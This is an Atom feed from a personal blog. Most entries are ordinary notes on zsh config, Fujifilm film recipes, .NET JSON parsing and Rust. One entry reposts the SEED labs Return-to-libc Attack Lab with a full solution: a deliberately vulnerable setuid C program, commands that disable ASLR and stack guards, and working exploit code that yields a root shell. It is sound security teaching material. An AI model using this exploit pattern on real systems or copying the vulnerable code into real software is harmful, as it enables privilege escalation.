<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangyue-vhyt.github.io</id>
    <title>咸鱼の家</title>
    <updated>2021-02-14T15:17:09.587Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangyue-vhyt.github.io"/>
    <link rel="self" href="https://zhangyue-vhyt.github.io/atom.xml"/>
    <subtitle>海带缠潜艇，雾霾防激光。</subtitle>
    <logo>https://zhangyue-vhyt.github.io/images/avatar.png</logo>
    <icon>https://zhangyue-vhyt.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, 咸鱼の家</rights>
    <entry>
        <title type="html"><![CDATA[[Machine Learning] CMPT 727: Statistical Machine Learning.]]></title>
        <id>https://zhangyue-vhyt.github.io/post/SFU-CMPT727/</id>
        <link href="https://zhangyue-vhyt.github.io/post/SFU-CMPT727/">
        </link>
        <updated>2021-02-13T22:21:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1>
<ul>
<li><a href="https://kivy-cn.github.io/MLAPP-CN/#/">MLAPP 中文笔记</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Cybersecurity] SEED labs - Return-to-libc Attack Lab]]></title>
        <id>https://zhangyue-vhyt.github.io/post/seed-labs-return-to-libc-attack-lab/</id>
        <link href="https://zhangyue-vhyt.github.io/post/seed-labs-return-to-libc-attack-lab/">
        </link>
        <updated>2021-02-12T15:07:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="原文链接">原文链接</h1>
<ul>
<li><a href="https://github.com/firmianay/Life-long-Learner/blob/master/SEED-labs/return-to-libc-attack-lab.md">SEEDlabs: Return-to-libc Attack Lab</a></li>
</ul>
<h1 id="seedlabs-return-to-libc-attack-lab">SEEDlabs: Return-to-libc Attack Lab</h1>
<h2 id="lab-overview">Lab Overview</h2>
<p>This attack can bypass an existing protection scheme currently implemented in major Linux operating systems. A common way to exploit a buffer-overflow vulnerability is to overflow the buffer with a malicious shellcode, and then cause the vulnerable program to jump to the shellcode that is stored in the stack. To prevent these types of attacks, some operating systems allow system administrators to make stacks non-executable; therefore, jumping to the shellcode will cause the program to fail. Unfortunately, the above protection scheme is not fool-proof; there exists a variant of buffer-overflow attack called the return-to-libc attack, which does not need an executable stack; it does not even use shell code. Instead, it causes the vulnerable program to jump to some existing code, such as the <code>system()</code> function in the <code>libc</code> library, which is already loaded into the memory.</p>
<h2 id="lab-tasks">Lab Tasks</h2>
<h3 id="initial-setup">Initial Setup</h3>
<p>Ubuntu and other Linux distributions have implemented several security mechanisms to make the buffer-overflow attack difficult. To simply our attacks, we need to disable them first.</p>
<p>(1) Address Space Randomization.<br>
Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this lab, we disable these features using the following commands:</p>
<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>
<p>(2) The StackGuard Protection Scheme.<br>
The GCC compiler implements a security mechanism called &quot;Stack Guard&quot; to prevent buffer overflows. In the presence of this protection, buffer overflow will not work. You can disable this protection if you compile the program using the <code>-fno-stack-protector</code> switch. For example, to compile a program example.c with Stack Guard disabled, you may use the following command:</p>
<pre><code>gcc -fno-stack-protector example.c
</code></pre>
<p>(3) Non-Executable Stack.<br>
Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the recent versions of gcc, and by default, the stack is set to be non-executable. To change that, use the following option when compiling programs:</p>
<pre><code>gcc -z execstack -o test test.c

gcc -z noexecstack -o test test.c
</code></pre>
<h3 id="the-vulnerable-program">The Vulnerable Program</h3>
<pre><code>/* relib.c */
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */

#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int bof(FILE *badfile)
{
    char buffer[12];

    /* The following statement has a buffer overflow problem */
    fread(buffer, sizeof(char), 40, badfile);

    return 1;
}

int main(int argc, char **argv)
{
    FILE *badfile;

    badfile = fopen(&quot;badfile&quot;, &quot;r&quot;);
    bof(badfile);

    printf(&quot;Returned Properly\n&quot;);

    fclose(badfile);
    return 1;
}
</code></pre>
<p>Compile the above vulnerarble program and make it set-root-uid.</p>
<pre><code>sudo gcc -fno-stack-protector -z noexecstack -o retlib retlib.c
sudo chmod 4755 retlib
</code></pre>
<p>The above program has a buffer overflow vulnerability. It first reads an input of size 40 bytes from a file called &quot;badfile&quot; into a buffer of size 12, causing the overflow. The function fread() does not check boundaries, so bufferoverflow will occur. Since this program is a set-root-uid program, if a normal user can exploit this buffer overflow vulnerability, the normal user might be able to get a root shell. It should be noted that the program gets its input from a file called &quot;badfile&quot;. This file is under users' control. Now, our objective is to create the contents for &quot;badfile&quot;. This file is under users' control. Now, our objective is to create the contents for &quot;badfile&quot;, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned.</p>
<h3 id="task-1-exploiting-the-vulnerability">Task 1: Exploiting the Vulnerability</h3>
<p>Create the badfile.</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);

  /* You need to decide the addresses and 
     the values for X, Y, Z. The order of the following 
     three statements does not imply the order of X, Y, Z.
     Actually, we intentionally scrambled the order. */
  *(long *) &amp;buf[X] = some address ;   //  &quot;/bin/sh&quot;
  *(long *) &amp;buf[Y] = some address ;   //  system()
  *(long *) &amp;buf[Z] = some address ;   //  exit()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
</code></pre>
<p>You need to figure out the values for those addresses, as well as to find out where to store those addresses. If you incorrectly calculate the locations, your attack might not work.</p>
<p>After you finish the above program, compile and run it; this will generate the contents for “badfile”. Run the vulnerable program <code>retlib</code>. If your exploit is implemented correctly, when the function <code>bof</code> returns, it will return to the <code>system()</code> libc function, and execute <code>system(&quot;/bin/sh&quot;)</code>. If the vulnerable program is running with the root privilege, you can get the root shell at this point.</p>
<p>It should be noted that the <code>exit()</code> function is not very necessary for this attack; however, without this function, when <code>system()</code> returns, the program might crash, causing suspicions.</p>
<pre><code>$ gcc -o exploit exploit.c
$ ./exploit       // create the badfile
$ ./retlib        // launch the attack by running the vulnerable program
# &lt;---- You've got a root shell!
</code></pre>
<p>Questions.</p>
<ul>
<li>Please describe how you decide the values for X, Y and Z.</li>
<li>After your attack is successful, change the file name of <code>retlib</code> to a different name, making sure that the length of the file names are different. For example, you can change it to <code>newretlib</code>. Repeat the attack (without changing the content of badfile). Is your attack successful or not?</li>
</ul>
<p>solution:</p>
<p>The following is return-to-libc stack:</p>
<pre><code>&lt;- stack grows this way
   addresses grow this way -&gt;
------------------------------------------------------------------------------
| buffer fill-up | f1 | pop-ret | f1_arg | f2 | dmm | f2_arg1 | f2_arg2 ... 
------------------------------------------------------------------------------
                                    ^
                                    |
                                    - this int32 should overwrite return address
                                        of a vulnerable function
</code></pre>
<p>So we should set <code>system</code>'s entry address at <code>bof</code>'s return address (<code>&amp;buf[24]</code>), set <code>system</code>'s argument address at <code>&amp;buf[32]</code>, and set <code>exit</code>'s entry address at <code>&amp;buf[36]</code>.</p>
<p>Then, find memory address:</p>
<pre><code>root@ubuntu:/home/seed# gcc -o -fno-stack-protector -z noexecstack -o retlib retlib.c 
root@ubuntu:/home/seed# chmod u+s retlib
root@ubuntu:/home/seed# gdb --quiet retlib
Reading symbols from /home/seed/retlib...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048528
(gdb) r
Starting program: /home/seed/retlib 
Breakpoint 1, 0x08048528 in main ()
(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f430 &lt;system&gt;
(gdb) p exit
$2 = {&lt;text variable, no debug info&gt;} 0xb7e52fb0 &lt;exit&gt;
</code></pre>
<p>We need write a program to get <code>/bin/sh</code>'s address:</p>
<pre><code>// getenv.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main(int argc, char const *argv[])
{
    char *ptr;
    if(argc &lt; 3)
    {
        printf(&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;, argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf(&quot;%s will be at %p\n&quot;, argv[1], ptr);
    return 0;
}
</code></pre>
<pre><code>seed@ubuntu:~$ export MYSHELL=/bin/sh
seed@ubuntu:~$ gcc -o getenv getenv.c 
seed@ubuntu:~$ ./getenv MYSHELL ./retlib
MYSHELL will be at 0xbffffe8a
</code></pre>
<p>We fill these address into exploit.c.</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
int main(int argc, char **argv)
{
    char buf[40];
    FILE *badfile;

    badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;);
    strcpy(buf,&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;);    // nop 24 times
    *(long *) &amp;buf[32] = 0xbffffe8a ;    // &quot;/bin/sh&quot;
    *(long *) &amp;buf[24] = 0xb7e5f430 ;    // system()
    *(long *) &amp;buf[36] = 0xb7e52fb0 ;    // exit()

    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
</code></pre>
<p>Now we exploit it:</p>
<pre><code>seed@ubuntu:~$ ./exploit
seed@ubuntu:~$ ./retlib
# whoami
root
</code></pre>
<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>
<p>In this task, let us turn on the Ubuntu's address randomization protection. We run the same attack developed in Task 1. Can you get a shell? If not, what is the problem? How does the address randomization make your return-to-libc attack difficult?</p>
<pre><code>sudo /sbin/sysctl -w kernel.randomize_va_space=2
</code></pre>
<p>Solution:<br>
Address randomization makes these addresses different every times.</p>
<pre><code>(gdb) p system
$3 = {&lt;text variable, no debug info&gt;} 0xb7600430 &lt;system&gt;
(gdb) p exit
$4 = {&lt;text variable, no debug info&gt;} 0xb75f3fb0 &lt;exit&gt;
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/seed/retlib 
Breakpoint 1, 0x080484b6 in main ()
(gdb) p system
$5 = {&lt;text variable, no debug info&gt;} 0xb7593430 &lt;system&gt;
(gdb) p exit
$6 = {&lt;text variable, no debug info&gt;} 0xb7586fb0 &lt;exit&gt;

seed@ubuntu:~$ ./getenv MYSHELL ./retlib
MYSHELL will be at 0xbf8d8e8a
seed@ubuntu:~$ ./getenv MYSHELL ./retlib
MYSHELL will be at 0xbff0de8a
seed@ubuntu:~$ ./getenv MYSHELL ./retlib
MYSHELL will be at 0xbfa3ce8a
</code></pre>
<h3 id="task-3-stack-guard-protection">Task 3: Stack Guard Protection</h3>
<p>In this task, let us turn on the Ubuntu's Stack Guard protection. Please remember to turn off the address randomization protection. We run the same attack developed in Task 1. Can you get a shell? If not, what is the problem? How does the Stack Guard protection make your return-to-libc attack difficult?</p>
<pre><code>sudo gcc -z noexecstack -o retlib retlib.c
sudo chmod 4755 retlib
</code></pre>
<p>Solution:</p>
<pre><code>root@ubuntu:/home/seed# /sbin/sysctl -w kernel.randomize_va_space=0
root@ubuntu:/home/seed# gcc -z noexecstack -o retlib retlib.c 
root@ubuntu:/home/seed# chmod 4755 retlib
root@ubuntu:/home/seed# exit
exit
[08/13/2016 00:35] seed@ubuntu:~$ ./retlib
*** stack smashing detected ***: ./retlib terminated
</code></pre>
<h2 id="guidelines-understanding-the-function-call-mechanism">Guidelines: Understanding the function call mechanism</h2>
<h3 id="find-out-the-addresses-of-libc-functions">Find out the addresses of libc functions</h3>
<p>To find out the address of any libc function, you can use the following <code>gdb</code> commands (a.out is an arbitrary program):</p>
<pre><code>$ gdb a.out

(gdb) b main
(gdb) r
(gdb) p system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f430 &lt;system&gt;
(gdb) p exit
$2 = {&lt;text variable, no debug info&gt;} 0xb7e52fb0 &lt;exit&gt;
</code></pre>
<p>From the above <code>gdb</code> commands, we can find out that the address for the <code>system()</code> function is <code>0xb7e5f430</code>, and the address for the <code>exit()</code> function is <code>0xb7e52fb0</code>. The actual addresses in your system might be different from these number.</p>
<h3 id="putting-the-shell-string-in-the-memory">Putting the shell string in the memory</h3>
<p>One of the challenge in this lab is to put the string &quot;<code>/bin/sh</code>&quot; into the memory, and get its address. This can be achieved using environment variables. When a C program is executed, it inherits all the environment variables from the shell that exevutes it. The environment variable SHELL points directly to <code>/bin/bash</code> and is needed by other programs, so we introduce a new shell variable MYSHELL and make it point to <code>zsh</code>.</p>
<pre><code>$ export MYSHELL=/bin/sh
</code></pre>
<p>We will use the address of this variable as an argument to <code>system()</code> call. The location of this variable in the memory can be found out easily using the following program:</p>
<pre><code>void main() {
    char* shell = getenv(&quot;MYSHELL&quot;);
    if(shell)
        printf(&quot;%x\n&quot;, (unsigned int)shell);
}
</code></pre>
<p>If the address randomization is turned off, you will find out that the same address is printed out. However, when you run the vulnerabile program <code>retlib</code>, the address of the environment variable might not be exactly the same as the one that you get by running the above program; such an address can even change when you change the name of your program (the number of characters in the file name makes difference). The good news is, the address of the shell will be quite close to what you print out using the above program. Therefore, you might need to try a few times to succeed.</p>
<h3 id="understand-the-stack">Understand the Stack</h3>
<p>To know how to conduct the <code>return-to-linc</code> attack, it is essential to understand how the stack works. We use a small C program to understand the effects of a function invocation on the stack.</p>
<pre><code>#include&lt;stdio.h&gt;
void foo(int x)
{
	printf(&quot;Hello world: %d\n&quot;, x);
}

int main()
{
	foo(1);
	return 0;
}
</code></pre>
<p>We can use &quot;gcc -S foobar.c&quot; to compile this program to the assemble code. The resulting file <code>foobar.s</code> will look like the following:</p>
<pre><code>seed@ubuntu:~$ gcc -S foobar.c 
seed@ubuntu:~$ cat -n foobar.s 
     8	foo:
     9		pushl	%ebp
    10		movl	%esp, %ebp
    11		subl	$8, %esp
    12      movl    8(%ebp), %eax
    13      movl    %eax, 4(%esp)
    14      movl    $.LC0, (%esp)   : string &quot;Hello world: %d\n&quot;
    15		call	printf
    16		leave
    17		ret
        ......
    21	main:
    22      leal    4(%esp), %ecx
    23      andl    $-16, %esp
    24      pushl   -4(%ecx)
    25      pushl   %ebp
    26      movl    %esp, %ebp
    27      pushl   %ecx
    28      subl    $4, %esp
    29      movl    $1, (%esp)
    30      call    foo
    31      movl    $0, %eax
    32      addl    $4, %esp
    33      popl    %ecx
    34      popl    %ebp
    35      leal    -4(%ecx), %esp
    36      ret
</code></pre>
<figure data-type="image" tabindex="1"><img src="./static/return-to-libc1.png" alt="return-to-libc1" loading="lazy"></figure>
<h3 id="calling-and-entering-foo">Calling and Entering foo()</h3>
<p>Let us concentrate on the stack while calling <code>foo()</code>. We can ignore the stack before that. Please note that line number instead of instruction addresses are used in this explanation.</p>
<p>Line 28-29: These two statements push the value 1, i.e. the argument to the <code>foo()</code>, into the stack. This operation increments <code>%esp</code> by four. The stack after these two statements is depicted in Figure 1(a).</p>
<p>Line 30: call foo: The statement pushes the address of the next instruction that immediately follows the <code>call</code> statement into the stack (i.e the return address), and then jumps to the code of <code>foo()</code>. The current stack is depicted in Figure 1(b).</p>
<p>Line 9-10: The first line of the function <code>foo()</code> pushes <code>%ebp</code> into the stack, to save the previous frame pointer. The second line lets <code>%ebp</code> point to the current frame. The current stack is depicted in Figure 1(c).</p>
<p>Line 11: subl $8, %esp: The stack pointer is modified to allocate space (8 bytes) for local variables and the two arguments passed to <code>printf</code>. Since there is no local variable in function <code>foo</code>, the 8 bytes are for arguments only. See Figure 1(d).</p>
<h3 id="leaving-foo">Leaving foo()</h3>
<p>Now the control has passed to the function <code>foo()</code>. Let us see what happens to the stack when the function returns.</p>
<p>Line 16: leave: This instruction implicitly performs two instructions (it was a macro in earlier x86 releases, but was made into an instruction later):</p>
<pre><code>    mov   %ebp, %esp
    pop   %ebp
</code></pre>
<p>The first statement release the stack space allocated for the function; the second statement recover the previous frame pointer. The current stack is depicted in Figure 1(e).</p>
<p>Line 17: ret: This instruction simply pops the return address out of the stack, and then jump to the return address. The current stack is depicted in Figure 1(f).</p>
<p>Line 32: addl  $4, %esp: Further resotre the stack by releasing more memories allocated for <code>foo</code>. As you can clearly see that the stack is now in exactly the same state as it was before entering the function <code>foo</code> (i.e, before line 28).</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Config] ZSH Config File (.zshrc)]]></title>
        <id>https://zhangyue-vhyt.github.io/post/zsh-config-file/</id>
        <link href="https://zhangyue-vhyt.github.io/post/zsh-config-file/">
        </link>
        <updated>2021-02-01T10:54:48.000Z</updated>
        <content type="html"><![CDATA[<pre><code class="language-shell">### Load antigen
# Github
# source ~/antigen.zsh

# Manjaro
# source /usr/share/zsh/share/antigen.zsh

# OpenSUSE build service (include Fedora)
# source /usr/share/antigen.zsh

# Debian
# source /usr/share/zsh-antigen/antigen.zsh

# Load the oh-my-zsh's library.
antigen use oh-my-zsh

# Bundles from the default repo (robbyrussell's oh-my-zsh).
antigen bundle git
antigen bundle heroku
antigen bundle pip
antigen bundle lein
antigen bundle command-not-found
antigen bundle docker
antigen bundle docker-compose
antigen bundle vi-mode

# Syntax highlighting bundle.
antigen bundle zsh-users/zsh-syntax-highlighting
antigen bundle zsh-users/zsh-autosuggestions

# Load the theme.
antigen theme https://github.com/caiogondim/bullet-train-oh-my-zsh-theme bullet-train

# Alias
# alias_name = &lt;command


# Tell Antigen that you're done.
antigen apply
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[摄影] 富士胶片模拟]]></title>
        <id>https://zhangyue-vhyt.github.io/post/fujixweekly/</id>
        <link href="https://zhangyue-vhyt.github.io/post/fujixweekly/">
        </link>
        <updated>2020-10-31T15:29:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="xt-20">XT-20</h1>
<h2 id="provia-万能">Provia 万能</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-3535490"> <a href="https://fujixweekly.com/2020/03/22/fujifilm-x-t1-agfa-optima-provia-film-simulation-recipe/">Agfa Optima<label class="task-list-item-label" for="task-item-3535490"> [Agfa Optima](https://fujixweekly.com/2020/03/22/fujifilm-x-t1-agfa-optima-provia-film-simulation-recipe/)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-321635"> <a href="https://fujixweekly.com/2020/09/22/fujifilm-x-t200-bayer-film-simulation-recipe-analog-cool/">Analog Cool<label class="task-list-item-label" for="task-item-321635"> [Analog Cool](https://fujixweekly.com/2020/09/22/fujifilm-x-t200-bayer-film-simulation-recipe-analog-cool/)</label></li>
</ul>
<h2 id="velvia-艳丽">Velvia 艳丽</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-1479430"> <a href="https://fujixweekly.com/2020/10/20/fujifilm-x-m1-x-trans-i-film-simulation-recipe-vivid-color/">Velvia<label class="task-list-item-label" for="task-item-1479430"> [Velvia](https://fujixweekly.com/2020/10/20/fujifilm-x-m1-x-trans-i-film-simulation-recipe-vivid-color/)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-3276079"> <a href="https://fujixweekly.com/2020/07/22/fujifilm-xq1-x-trans-ii-film-simulation-recipe-lomography-color-100/">Lomography Color 100<label class="task-list-item-label" for="task-item-3276079"> [Lomography Color 100](https://fujixweekly.com/2020/07/22/fujifilm-xq1-x-trans-ii-film-simulation-recipe-lomography-color-100/)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-6194037"> <a href="https://fujixweekly.com/2020/02/17/fujifilm-x-t1-x-trans-ii-ektachrome-100sw-film-simulation-recipe/">Ektachrome 100SW<label class="task-list-item-label" for="task-item-6194037"> [Ektachrome 100SW](https://fujixweekly.com/2020/02/17/fujifilm-x-t1-x-trans-ii-ektachrome-100sw-film-simulation-recipe/)</label></li>
</ul>
<h2 id="astia-柔和">Astia 柔和</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-1398020"> <a href="https://fujixweekly.com/2020/08/22/fujifilm-x-trans-ii-film-simulation-recipe-astia/">Astia 万能<label class="task-list-item-label" for="task-item-1398020"> [Astia 万能](https://fujixweekly.com/2020/08/22/fujifilm-x-trans-ii-film-simulation-recipe-astia/)</label></li>
</ul>
<h2 id="classic-chrome-复古">Classic Chrome 复古</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-5498204"> <a href="https://fujixweekly.com/2020/11/03/fujifilm-x100v-film-simulation-recipe-kodak-portra-800/">Kodak Portra 800<label class="task-list-item-label" for="task-item-5498204"> [Kodak Portra 800](https://fujixweekly.com/2020/11/03/fujifilm-x100v-film-simulation-recipe-kodak-portra-800/)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-4226933"> <a href="https://fujixweekly.com/2020/03/29/not-my-fujifilm-x-t1-x-trans-ii-kodak-portra-160-film-simulation-recipe/">Kodak Portra 160<label class="task-list-item-label" for="task-item-4226933"> [Kodak Portra 160](https://fujixweekly.com/2020/03/29/not-my-fujifilm-x-t1-x-trans-ii-kodak-portra-160-film-simulation-recipe/)</label></li>
<li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox" id="task-item-1426499"> <a href="https://fujixweekly.com/2020/09/12/fujifilm-x100v-film-simulation-recipe-preet/">Bright Summer<label class="task-list-item-label" for="task-item-1426499"> [Bright Summer](https://fujixweekly.com/2020/09/12/fujifilm-x100v-film-simulation-recipe-preet/)</label></li>
</ul>
<h2 id="classic-negative">Classic Negative</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-2104912"> <a href="https://fujixweekly.com/2020/09/28/fujifilm-x100v-film-simulation-recipe-agfa-vista-100/">Agfa<label class="task-list-item-label" for="task-item-2104912"> [Agfa](https://fujixweekly.com/2020/09/28/fujifilm-x100v-film-simulation-recipe-agfa-vista-100/)</label></li>
</ul>
<h2 id="pro-neg-std-负片">PRO Neg. Std 负片</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-6699223"> <a href="https://fujixweekly.com/2020/10/27/fujifilm-x-t1-x-trans-ii-film-simulation-recipe-porto-200/">Porto 200 秋意<label class="task-list-item-label" for="task-item-6699223"> [Porto 200 秋意](https://fujixweekly.com/2020/10/27/fujifilm-x-t1-x-trans-ii-film-simulation-recipe-porto-200/)</label></li>
</ul>
<h1 id="富士胶片模拟表">富士胶片模拟表</h1>
<figure data-type="image" tabindex="1"><img src="https://zhangyue-vhyt.github.io/post-images/1604558033705.jpg" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[.Net] .Net 解析 JSON]]></title>
        <id>https://zhangyue-vhyt.github.io/post/dotnet-json/</id>
        <link href="https://zhangyue-vhyt.github.io/post/dotnet-json/">
        </link>
        <updated>2020-06-22T11:21:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="引言">引言</h1>
<p>目前解析 JSON 用的库主流有两种，<code>System.Text.Json</code> 和 <code>Json.Net</code> 其中 <code>System.Text.Json</code> 是官方库，但还很不成熟。<code>Json.Net</code> 虽然是第三方库但也有官方背书，在 <code>Asp.Net</code> 官方模板中是直接引入的，功能完备项目成熟。本篇记录一下 <code>Json.Net</code> 的使用方法。</p>
<h1 id="准备工作">准备工作</h1>
<p>首先我们准备一份复杂嵌套的 <code>.json</code> 文件，比如 <a href="https://github.com/ZhangYue-vhyt/Games/blob/master/Black%20Desert%20Mobile/BlueStack/resources/events.json"><code>events.json</code></a>。</p>
<h2 id="读取文件">读取文件</h2>
<pre><code class="language-csharp">using System.IO;

var jsonString = File.ReadAllText(@&quot;./resource/events.json&quot;);
</code></pre>
<p>这里读取文件采用的是 <code>File.ReadAllText</code>，因为要一次性读取所有内容。</p>
<h2 id="反序列化">反序列化</h2>
<pre><code class="language-csharp">using Newtonsoft.Json.Linq;

void Deserialize(string jsonString)
{
    dynamic data = JObject.Parse(jsonString);
    ...
}
</code></pre>
<p>取出的数据可以向 python 那样操作</p>
<pre><code class="language-csharp">data[&quot;AutoLock&quot;];
data[&quot;Menu&quot;][&quot;Pet&quot;];
data[&quot;BlackSpirit&quot;][&quot;DarkEnergy&quot;][&quot;AbsorbEnergy&quot;];
</code></pre>
<p>数据类型有 <code>JArray</code>、<code>JObject</code>、<code>JProperty</code>。</p>
<h2 id="类型转换">类型转换</h2>
<p><code>JProperty</code> 和 <code>JObject</code> 类型使用 <code>ToObject&lt;T&gt;()</code> 转换成 .Net 类型</p>
<pre><code class="language-csharp">data[&quot;AutoLock&quot;][0][&quot;Timestamp&quot;].ToObject&lt;int&gt;();
data[&quot;AutoLock&quot;][0][&quot;EventType&quot;].ToString();
</code></pre>
<p><code>JArray</code> 类型需要使用 Linq，参考<a href="https://www.newtonsoft.com/json/help/html/DeserializeWithLinq.htm">官方示例</a>。</p>
<h2 id="序列化">序列化</h2>
<pre><code class="language-csharp">var jsonString = JObject.FromObject(obj).ToString();    // Serializing objects.

var jsonString = JsonConvert.SerializeObject(list, Formatting.Indented);    // Serializing collections.
</code></pre>
<h2 id="写入文件">写入文件</h2>
<pre><code class="language-csharp">File.WriteAllText(filePath, jsonString);
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Rust] Rust 学习笔记]]></title>
        <id>https://zhangyue-vhyt.github.io/post/rust-notes/</id>
        <link href="https://zhangyue-vhyt.github.io/post/rust-notes/">
        </link>
        <updated>2020-05-22T17:33:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>章节目录是根据《Rust 编程之道》排序的。</p>
<h1 id="第-1-章-新时代的语言">第 1 章 新时代的语言</h1>
<p>书中这部分内容可以跳过。此处罗列下 Rust 和 C# 中术语的映射关系。</p>
<ol>
<li>Workspace -&gt; Solution</li>
<li>Crate -&gt; Project</li>
<li>Module -&gt; Namespace</li>
<li>Trait -&gt; Interface</li>
<li>Struct -&gt; Class</li>
<li>Function -&gt; Method</li>
</ol>
<ul>
<li><a href="https://prev.rust-lang.org/zh-CN/documentation.html">Rust 语言文档</a></li>
</ul>
<h1 id="第-2-章-流程控制">第 2 章 流程控制</h1>
<h2 id="253-match-表达式与模式匹配">2.5.3 <code>match</code> 表达式与模式匹配</h2>
<blockquote>
<p><code>match</code> 用于匹配各种情况。有点类似其他编程语言中的 <code>switch</code> 或 <code>case</code> 语句。</p>
</blockquote>
<ul>
<li><a href="https://kaisery.github.io/trpl-zh-cn/ch06-02-match.html"><code>match</code> 控制流运算符</a></li>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/flow_control/match.html"><code>match</code> 匹配</a></li>
</ul>
<h2 id="254-if-let-和-while-let-表达式">2.5.4 <code>if let</code> 和 <code>while let</code> 表达式</h2>
<ul>
<li><a href="https://kaisery.github.io/trpl-zh-cn/ch06-03-if-let.html"><code>if let</code> 简单控制流</a></li>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/flow_control/if_let.html">if let</a></li>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/flow_control/while_let.html">while let</a></li>
</ul>
<h1 id="第-8-章-字符串与集合类型">第 8 章 字符串与集合类型</h1>
<h2 id="82-集合类型">8.2 集合类型</h2>
<h3 id="821-动态可增长数组">8.2.1 动态可增长数组</h3>
<h4 id="相等性">相等性</h4>
<pre><code class="language-rust">let a = vec![1,2,3];
let b = vec![1,2,3];
assert!(a.eq(&amp;b));  // True
</code></pre>
<h3 id="822-映射集">8.2.2 映射集</h3>
<h1 id="第-9-章-构建健壮的程序">第 9 章 构建健壮的程序</h1>
<h2 id="93-分层处理错误">9.3 分层处理错误</h2>
<h3 id="931-可选值-optiont">9.3.1 可选值 <code>Option&lt;T&gt;</code></h3>
<ul>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/error/option_unwrap.html"><code>Option</code> 和 <code>unwrap</code></a></li>
<li><a href="https://zhuanlan.zhihu.com/p/130487519">个人博客搭建日记 2020-04-14 学习rust</a></li>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/error/option_unwrap/map.html">组合算子：<code>map</code></a></li>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/error/option_unwrap/and_then.html">组合算子：<code>and_then</code></a></li>
</ul>
<h4 id="932-错误处理-resultt-e">9.3.2 错误处理 <code>Result&lt;T, E&gt;</code></h4>
<ul>
<li><a href="https://rustwiki.org/zh-CN/rust-by-example/error/result.html">结果 <code>Result</code></a></li>
</ul>
<h1 id="第-10-章-模块化编程">第 10 章 模块化编程</h1>
<h2 id="100-cargo-工作空间">10.0 Cargo 工作空间</h2>
<p>这部分内容书里面没有，是我自己加的。</p>
<ul>
<li>Rust 中的工作空间 (Workspace) 即 C# 的解决方案 (Solution)。</li>
<li><a href="https://kaisery.github.io/trpl-zh-cn/ch14-03-cargo-workspaces.html">Cargo 工作空间</a></li>
</ul>
